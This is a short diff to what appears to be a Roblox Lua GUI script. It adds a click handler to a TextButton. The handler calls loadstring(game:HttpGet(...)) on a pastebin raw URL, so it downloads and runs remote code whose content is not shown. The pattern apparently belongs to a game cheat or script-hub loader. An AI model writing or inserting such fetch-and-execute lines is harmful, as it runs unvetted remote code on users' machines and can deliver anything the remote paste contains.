@@ -35,6 +35,9 @@ TextButton.Size = UDim2.new(0, 138, 0, 31)
 TextButton.Font = Enum.Font.SourceSans
 TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton.TextSize = 14.000
+TextButton.MouseButton1Down:connect(function()
+loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
+end)
 
 UICorner.Parent = TextButton
 
